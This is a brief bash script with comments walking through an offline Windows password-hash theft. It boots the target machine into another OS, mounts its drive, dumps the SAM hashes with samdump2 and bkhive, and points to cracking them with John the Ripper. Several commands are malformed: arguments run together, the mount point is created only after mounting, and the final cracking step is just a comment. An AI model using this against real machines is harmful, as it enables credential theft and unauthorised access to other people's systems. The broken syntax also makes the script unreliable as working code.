#!/bin/bash

#shut down the target machine
#Boot the target to another os ( eg kali) and download this script and run
#mount the local hard drive
   mount/dev/sda1/mnt/sda1
  
#if you dont have sda1 then use fdisk-l cmd which will display list of drives available on target system

#create a mount point in the mount directory
   mkdir/mnt/sda1

#navigate to Sytem32 directory for SAM file
   cd/mnt/sda1/Windows/System32/config
   ls

#extract the hashes using Samdump2
   Samdump2 System SAM > /tmp/hashes.txt

#Note...some windows system may require extra step  i.e use bkhieve to extract System key for fully exposing password hashes

#remove comment  for using below command

   #bkhive SYSTEM sys_key.txt 

#in some cases SYSTEM is in lowercase

   #Samdump2 SAM sys_key.txt >/tmp/hash.txt
 
#crack the password from hashes using Johny the Ripper(JtR)
   
